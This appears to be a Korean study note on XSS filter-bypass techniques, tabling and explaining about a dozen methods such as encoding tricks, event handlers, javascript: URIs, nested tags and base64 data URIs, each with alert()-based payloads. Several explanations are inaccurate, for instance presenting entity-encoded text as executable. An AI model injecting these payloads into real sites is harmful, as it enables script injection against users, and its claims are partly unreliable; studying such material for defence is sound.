# XSS 우회 기법

🔗[참고 사이트 1](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
🔗[참고 사이트 2](https://github.com/payloadbox/xss-payload-list)

| **우회 기법**                 | **설명**                                                                                      | **예시**                                                                                                       |
| ------------------------- | ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| **HTML 인코딩 우회**           | HTML 인코딩을 사용하여 특수 문자를 인코딩하여 필터링을 우회                                                         | `&lt;script&gt;alert('XSS')&lt;/script&gt;`                                                                  |
| **유니코드/이스케이프 문자 우회**      | 유니코드 또는 이스케이프 문자를 이용하여 필터링을 우회                                                              | `&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;` <br> `\u003Cscript\u003Ealert('XSS')\u003C/script\u003E` |
| **DOM 기반 XSS 우회**         | 서버 사이드 필터링 없이 클라이언트 사이드에서 동적으로 데이터를 처리할 때 발생하는 XSS. URL 파라미터나 쿠키를 통해 전달된 데이터를 클라이언트 측에서 처리. | `<img src="x" onerror="alert(1)">` <br> `<svg src="x" onclick="alert(1)">`                                                                          |
| **이벤트 핸들러 우회**            | `onmouseover`, `onload`와 같은 이벤트 핸들러를 사용하여 XSS를 실행                                           | `<img src="x" onerror="alert('XSS')">` <br> `<a href="#" onmouseover="alert('XSS')">Click me</a>`            |
| **JavaScript 프로토콜 우회**    | `javascript:` 스킴을 활용하여 악성 스크립트를 실행하는 방법                                                     | `<a href="javascript:alert('XSS')">Click here</a>`                                                           |
| **CSS 및 스타일 속성 우회**       | CSS 속성에서 `background-image` 등을 사용하여 XSS를 우회                                                 | `<div style="background-image: url('javascript:alert(1)')">Test</div>`                                       |
| **Base64 인코딩 우회**         | Base64로 인코딩된 악성 스크립트를 삽입하여 필터링을 우회                                                          | `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`                                             |
| **iframe / Object 태그 우회** | `iframe`이나 `object` 태그를 사용하여 외부 자원을 통해 악성 스크립트를 실행                                          | `<iframe src="javascript:alert('XSS')"></iframe>` <br> `<object data="javascript:alert('XSS')"></object>`    |
| **AJAX / JSONP 우회**       | 서버에서 JSON 응답을 받을 때, JSONP 콜백 함수에 악성 스크립트를 삽입                                                | `callback = function() { alert('XSS') };`                                                                    |
| **HTML5 데이터 속성 우회**       | HTML5의 `data-*` 속성에서 악성 스크립트를 삽입하여 XSS를 우회                                                  | `<div data-info="<script>alert('XSS')</script>">Test</div>`                                                  |

---

## 🧨 그 외 필터 우회 기법 예시 (Bypass Techniques)

| 기법            | 설명                         | 예시                                                         |
| ------------- | -------------------------- | ---------------------------------------------------------- |
| 대소문자 우회       | `onerror` → `oNerror`      | `<img src=x oNerror=alert(1)>`                             |
| 이중 태그         | 태그 중간 삽입                   | `<scr<script>ipt>alert(1)</script>`                        |
| 자바스크립트 인코딩    | `String.fromCharCode()` 사용 | `eval(String.fromCharCode(97,108,...))`                    |
| `data:` URI   | HTML/JS 코드 삽입용             | `location.href='data:text/html,<script>alert(1)</script>'` |
| HTML Entities | 특수 문자 인코딩                  | `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`            |
| Null 문자 우회    | 필터 우회에 사용 (일부 서버/브라우저에서)   | `<img src=x%00 onerror=alert(1)>`                          |


* <scr<script>ipt>alert(1)</scr</script>ipt>    ← 중첩 태그 사용
* <img src="x" onerror=alert(1)>    ← 태그 속성 활용
  
---

### 1. **HTML 인코딩 우회**

웹 애플리케이션이 **HTML 인코딩**을 사용하여 사용자 입력을 처리할 때, 일부 문자를 **인코딩하여 출력**하도록 설정하는 경우, 인코딩된 문자열을 통해 XSS 공격을 우회할 수 있습니다.

#### 예시:

* **기본적인 XSS**: `<script>alert('XSS')</script>`
* **HTML 인코딩 우회**:

  * `&lt;script&gt;alert('XSS')&lt;/script&gt;`
  * `&#60;script&#62;alert('XSS')&#60;/script&#62;`

**공격자**는 HTML 인코딩을 사용하여 `<`, `>`, `'`, `"` 등 **특수 문자를 인코딩**하여 필터링을 우회하고 스크립트를 실행할 수 있습니다.

---

### 2. **Unicode 및 유니코드 이스케이프 문자 우회**

**유니코드 문자**를 이용한 우회 기법은 **HTML 엔티티** 또는 **이스케이프 문자**를 활용하여 필터링을 우회하는 방식입니다. 일부 필터링 메커니즘은 유니코드를 처리하지 않으므로 이를 이용해 XSS 공격을 우회할 수 있습니다.


#### 예시: 유니코드 인코딩(\u003C, \u003E)과 퍼센트 인코딩(%3C, %3E) 등을 사용하여 필터를 우회하는 방법

* `&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;`
* `\u003Cscript\u003Ealert('XSS')\u003C/script\u003E`


---

### 3. **DOM 기반 XSS 우회**

**DOM-based XSS**는 서버 사이드에서 필터링을 하지 않더라도 **클라이언트 사이드 JavaScript**가 HTML DOM을 수정하면서 발생할 수 있습니다. 이 경우, JavaScript에서 **URL 파라미터**나 **쿠키** 등으로 전달된 데이터를 동적으로 처리하는 방식에서 XSS가 발생할 수 있습니다.

#### 예시:

* `<img src="x" onerror="alert(1)">`

  * 이 예시에서 `onerror` 이벤트 핸들러를 우회하여 XSS를 실행할 수 있습니다. 이벤트 핸들러가 HTML 속성으로 포함되면 필터링이 우회될 수 있습니다.

#### 우회 기법:

* `javascript:` 스킴을 활용한 우회

  * `href="javascript:alert('XSS')"`
  * URL 파라미터나 링크에 `javascript:`를 사용하여 XSS를 실행할 수 있습니다.

---

### 4. **Event Handler를 통한 우회**

HTML 태그에서 **이벤트 핸들러**(예: `onmouseover`, `onerror`, `onload`)를 통해 JavaScript 코드를 실행하는 기법입니다. 일부 필터링 메커니즘은 `onmouseover`, `onload`와 같은 이벤트를 허용할 수 있기 때문에 이를 이용해 공격을 우회할 수 있습니다.

#### 예시:

```html
<img src="x" onerror="alert('XSS')">
<a href="#" onmouseover="alert('XSS')">Click me</a>
```

이벤트 핸들러는 `<script>` 태그를 사용하는 것보다 **HTML 속성 내에 스크립트를 포함**시킬 수 있기 때문에 필터를 우회할 수 있습니다.

---

### 5. **JavaScript 프로토콜 우회**

**JavaScript 프로토콜**을 사용하면 공격자는 **URL**의 **href** 속성에 **JavaScript** 코드를 실행할 수 있습니다. 이는 **하이퍼링크** 또는 **`src` 속성**에서 XSS를 유발할 수 있습니다.

#### 예시:

```html
<a href="javascript:alert(1)">Click</a>
```

**퍼센트 인코딩**:

```
jav%0aascrip%0at:alert(1)
```

* `<a href="javascript:alert('XSS')">Click here</a>`
* `<img src="javascript:alert('XSS')">`

필터링이 `href="javascript:"`를 막지 않는다면, 사용자가 링크를 클릭했을 때 악성 스크립트가 실행됩니다.

---

### 6. **CSS 및 스타일 속성 우회**

**CSS**와 **스타일 속성** 내에서 **JavaScript**를 실행하는 기법입니다. `background-image`와 같은 CSS 속성에서는 **JavaScript 코드**를 실행할 수 있는 취약점이 존재할 수 있습니다.

#### 예시:

```html
<div style="background-image: url('javascript:alert(1)')">Test</div>
```

* CSS 스타일 내에서 `url()` 함수로 **JavaScript**를 호출하여 XSS를 우회할 수 있습니다.

---

### 7. **Base64 인코딩 우회**

Base64 인코딩을 사용하면 **악성 스크립트**를 **인코딩된 문자열**로 변환하여 XSS 필터를 우회할 수 있습니다. 일부 필터링 시스템은 Base64 인코딩된 데이터를 허용하는 경우가 있습니다.

#### 예시:

* `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

Base64로 인코딩된 `alert('XSS')`가 **서버에서 전달되거나 HTML로 렌더링**될 때, 클라이언트 측에서 **디코딩**하여 **스크립트를 실행**하게 됩니다.

---

### 8. **iframe 및 Object 태그 우회**

**iframe**이나 **object** 태그를 사용하여 외부 웹 페이지를 삽입하거나, 내부에서 JavaScript를 실행하는 방식입니다. 이를 통해 **서드파티**에서 악성 스크립트를 로드할 수 있습니다.

#### 예시:

```html
<iframe src="javascript:alert('XSS')"></iframe>
<object data="javascript:alert('XSS')"></object>
```

이 기법은 필터링을 우회하여 외부 자원을 통해 악성 코드를 실행할 수 있습니다.

---

### 9. **AJAX 및 JSONP 우회**

AJAX나 JSONP를 사용하는 경우, **서버에서 JSON 응답을 받아 처리하는 과정**에서 XSS가 발생할 수 있습니다. **JSONP**는 **callback 함수**를 사용하여 데이터를 반환하기 때문에, 필터링이 제대로 되지 않으면 **스크립트 삽입**이 가능해질 수 있습니다.

#### 예시:

```javascript
callback = function() { alert('XSS') };
```

#### 우회 기법:

* **JSONP 응답에서 악성 스크립트 삽입**: 서버에서 JSONP 응답을 받을 때, 콜백 함수에 **악성 코드를 삽입**하여 실행할 수 있습니다.

---

### 10. **HTML5 데이터 속성 우회**

HTML5에서는 다양한 **데이터 속성**(예: `data-*` 속성)을 제공하는데, 이를 통해 XSS 공격을 우회할 수 있습니다. 이 속성들은 필터링에서 제외될 수 있으므로 이를 악용할 수 있습니다.

#### 예시:

```html
<div data-info="<script>alert('XSS')</script>">Test</div>
```

**JavaScript**에서 이 속성의 값을 읽어 **스크립트 실행**할 수 있기 때문에 우회가 가능합니다.


